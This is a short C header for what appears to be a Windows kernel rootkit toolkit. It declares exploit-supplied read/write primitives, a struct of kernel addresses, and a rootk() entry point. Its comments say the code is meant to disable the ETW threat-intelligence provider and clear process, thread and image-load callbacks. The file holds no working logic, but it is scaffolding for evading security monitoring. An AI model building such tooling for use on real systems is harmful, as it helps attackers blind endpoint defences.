#pragma once
#ifndef RKTOOLS_H
#define RKTOOLS_H
#include <windows.h>


// Define read and write primitive functions (hDriver can be NULL in some exploits)
typedef ULONGLONG(__fastcall* _readqword)(
	HANDLE hDriver,
	ULONGLONG readwhere
	);
typedef void(__fastcall* _writeqword)(
	HANDLE hDriver,
	ULONGLONG writewhere,
	ULONGLONG writewhat
	);

// Define struct passed in from exploit (Add additional parameters if necessary)
//	Set any addresses resolved with GetProcAddress in advance, to avoid BSOD in PreviousMode exploits
typedef struct _EXP_OUT
{
	LPVOID readprimitive;					//	Cast this to _readqword in rootk()
	LPVOID writeprimitive;					//	Cast this to _writeqword in rootk()
	DWORD myProcessId;							// To avoid using GetCurrentProcessId() in post-ex code
	HANDLE vulnDriver;							// In cases like IOCTLs exposing RW
	ULONGLONG systemEprocess;					// To iterate through EPROCESS list
	ULONGLONG KeInsertQueueApc;					// To find set ETWti bit and disable it
	ULONGLONG PsSetCreateProcessNotifyRoutine;	// To clear process callbacks
	ULONGLONG PsSetCreateThreadNotifyRoutine;	// To clear thread callbacks
	ULONGLONG PsSetLoadImageNotifyRoutine;		// To clear DLL (image load) callbacks
} EXP_OUT, * PEXP_OUT;

// Exported function to call from exploit
void rootk(PEXP_OUT rkStruct);


#endif
